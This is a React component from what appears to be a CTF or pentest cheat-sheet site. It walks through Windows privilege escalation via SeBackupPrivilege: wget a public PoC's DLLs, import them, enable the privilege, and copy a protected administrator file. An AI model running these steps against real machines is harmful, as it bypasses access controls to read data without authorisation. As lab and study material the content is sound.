import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import Link from "next/link";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const SeBackupPrivilege = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              The SeBackupPrivilege allows us to traverse any folder and list
              the folder contents. This will let us copy a file from a folder,
              even if there is no access control entry (ACE) for us in the
              folder's access control list (ACL). However, we can't dothis using
              the standard copy command. Instead, we need to programmatically
              copy the data, making sure to specify the
              FILE_FLAG_BACKUP_SEMANTICS flag.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              Download the PoC from here:
              https://github.com/giuliano108/SeBackupPrivilege
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeCmdLets.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "wget https://github.com/giuliano108/SeBackupPrivilege/blob/master/SeBackupPrivilegeCmdLets/bin/Debug/SeBackupPrivilegeUtils.dll"
              }
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <Typography>Import the module.</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module .\\SeBackupPrivilegeUtils.dll"}
            </SyntaxHighlighter>
            <Box sx={{ m: 2 }} />
            <SyntaxHighlighter className="syntax" language="bash">
              {"Import-Module .\\SeBackupPrivilegeCmdLets.dll"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 3</Typography>
            <Typography>
              If `SeBackupPrivilege` is disabled, you can enable it with the
              command:
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"Set-SeBackupPrivilege"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 4</Typography>
            <Typography>
              We can now access files we don't have permissions to with the
              following command
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {
                "Copy-FileSeBackupPrivilege 'C:\\Users\\Administrators\\flag.txt' .\\flag.txt"
              }
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default SeBackupPrivilege;
